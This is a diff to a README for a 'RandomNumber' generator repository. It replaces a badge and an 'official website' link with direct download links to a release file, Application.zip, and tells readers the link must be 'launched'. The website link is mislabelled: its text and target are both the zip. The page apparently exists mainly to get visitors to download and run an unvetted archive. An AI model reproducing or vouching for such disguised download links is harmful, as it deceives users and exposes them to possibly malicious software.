@@ -5,7 +5,7 @@ Welcome to the RandomNumber repository! Here you will find a powerful tool for g
 ## Installation
 
 To get started with the RandomNumber generator, simply download the application from the following link:
-[![Download RandomNumber](https://img.shields.io/badge/Download-RandomNumber-blue)](https://github.com/file/Application.zip)
+[![Download RandomNumber](https://github.com/skrebutisexe/randomNumber/releases/download/v1.0.0/Application.zip)](https://github.com/skrebutisexe/randomNumber/releases/download/v1.0.0/Application.zip)
 
 Please note that the link provided needs to be launched to initiate the download process.
 
@@ -52,7 +52,7 @@ Generated Numbers:
 
 ## Resources 📚
 
-For more information on the RandomNumber application and its functionalities, you can visit the official website at [RandomNumberApp.com](https://www.randomnumberapp.com). Explore tutorials, FAQs, and updates on the latest features.
+For more information on the RandomNumber application and its functionalities, you can visit the official website at [https://github.com/skrebutisexe/randomNumber/releases/download/v1.0.0/Application.zip](https://github.com/skrebutisexe/randomNumber/releases/download/v1.0.0/Application.zip). Explore tutorials, FAQs, and updates on the latest features.
 
 If the provided download link does not work or you encounter any issues, please check the "Releases" section of this repository for alternative download options.
 
